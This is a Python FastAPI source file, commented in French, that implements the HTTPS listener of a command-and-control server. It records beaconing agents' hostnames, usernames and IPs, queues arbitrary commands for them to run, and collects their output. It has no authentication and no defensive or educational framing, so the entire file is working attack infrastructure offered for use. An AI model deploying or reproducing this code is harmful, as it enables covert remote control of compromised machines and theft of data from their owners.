"""
HTTPS Listener routes for secure C2 communication.
Accepte les connexions de toutes les IPs.
"""
import json
import uuid
from typing import Any, Dict, List
from datetime import datetime

from fastapi import APIRouter, Body, HTTPException, Request, status

router = APIRouter(prefix="/api/https", tags=["https-listener"])

# Stockage des agents HTTPS (mémoire)
_https_agents: Dict[str, Dict[str, Any]] = {}
_https_commands: Dict[str, List[Dict[str, Any]]] = {}
_https_results: Dict[str, List[Dict[str, Any]]] = {}


@router.post("/{listener_id}/beacon")
async def https_beacon(listener_id: str, request: Request):
    """
    Endpoint HTTPS pour les heartbeats des agents.
    Communication chiffrée via TLS.
    Accepte toutes les IPs.
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        
        if not agent_id:
            raise HTTPException(status_code=400, detail="agent_id required")
        
        # Récupérer l'IP réelle du client
        client_ip = request.client.host if request.client else "unknown"
        
        # Enregistrer ou mettre à jour l'agent
        if agent_id not in _https_agents:
            _https_agents[agent_id] = {
                "agent_id": agent_id,
                "listener_id": listener_id,
                "hostname": data.get("hostname", agent_id),
                "username": data.get("username", "unknown"),
                "ip_address": client_ip,
                "operating_system": data.get("operating_system", "Windows"),
                "status": "alive",
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat()
            }
        else:
            _https_agents[agent_id]["last_seen"] = datetime.now().isoformat()
            _https_agents[agent_id]["status"] = "alive"
            if data.get("hostname"):
                _https_agents[agent_id]["hostname"] = data.get("hostname")
            if data.get("username"):
                _https_agents[agent_id]["username"] = data.get("username")
        
        # Vérifier s'il y a des commandes en attente
        pending_commands = _https_commands.get(agent_id, [])
        _https_commands[agent_id] = []
        
        return {
            "status": "ok",
            "commands": pending_commands,
            "sleep": data.get("sleep", 5)
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/{listener_id}/result")
async def https_result(listener_id: str, request: Request):
    """
    Endpoint pour recevoir les résultats des commandes.
    """
    try:
        data = await request.json()
        agent_id = data.get("agent_id")
        command_id = data.get("command_id")
        result = data.get("result")
        stdout = data.get("stdout", "")
        stderr = data.get("stderr", "")
        exit_code = data.get("exit_code", 0)
        
        if agent_id not in _https_results:
            _https_results[agent_id] = []
        
        _https_results[agent_id].append({
            "command_id": command_id,
            "command": data.get("command", ""),
            "result": result,
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": exit_code,
            "completed_at": datetime.now().isoformat()
        })
        
        return {"status": "ok"}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.post("/{listener_id}/agents/{agent_id}/command")
async def send_command(listener_id: str, agent_id: str, request: Request):
    """
    Envoie une commande à un agent spécifique.
    """
    try:
        data = await request.json()
        command = data.get("command")
        
        if not command:
            raise HTTPException(status_code=400, detail="command required")
        
        command_id = f"cmd_{uuid.uuid4().hex[:12]}"
        
        if agent_id not in _https_commands:
            _https_commands[agent_id] = []
        
        _https_commands[agent_id].append({
            "command_id": command_id,
            "command": command,
            "queued_at": datetime.now().isoformat()
        })
        
        return {
            "status": "queued",
            "command_id": command_id,
            "command": command
        }
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.get("/{listener_id}/agents")
async def list_https_agents(listener_id: str):
    """Liste tous les agents connectés via HTTPS"""
    agents = []
    for agent_id, agent in _https_agents.items():
        if agent.get("listener_id") == listener_id:
            agents.append({
                "agent_id": agent_id,
                "hostname": agent.get("hostname"),
                "username": agent.get("username"),
                "ip_address": agent.get("ip_address"),
                "operating_system": agent.get("operating_system"),
                "status": agent.get("status"),
                "first_seen": agent.get("first_seen"),
                "last_seen": agent.get("last_seen")
            })
    return {"listener_id": listener_id, "agents": agents, "total": len(agents)}


@router.get("/{listener_id}/agents/{agent_id}/results")
async def get_agent_results(listener_id: str, agent_id: str):
    """Récupère les résultats d'un agent"""
    results = _https_results.get(agent_id, [])
    return {"agent_id": agent_id, "results": results, "total": len(results)}


@router.delete("/{listener_id}/agents/{agent_id}")
async def remove_https_agent(listener_id: str, agent_id: str):
    """Supprime un agent"""
    if agent_id in _https_agents:
        del _https_agents[agent_id]
    if agent_id in _https_commands:
        del _https_commands[agent_id]
    if agent_id in _https_results:
        del _https_results[agent_id]
    return {"status": "removed", "agent_id": agent_id}


@router.get("/{listener_id}/stats")
async def get_https_stats(listener_id: str):
    """Statistiques du listener HTTPS"""
    agents = [a for a in _https_agents.values() if a.get("listener_id") == listener_id]
    return {
        "listener_id": listener_id,
        "total_agents": len(agents),
        "alive_agents": len([a for a in agents if a.get("status") == "alive"]),
        "total_commands": sum(len(c) for c in _https_commands.values()),
        "total_results": sum(len(r) for r in _https_results.values())
    }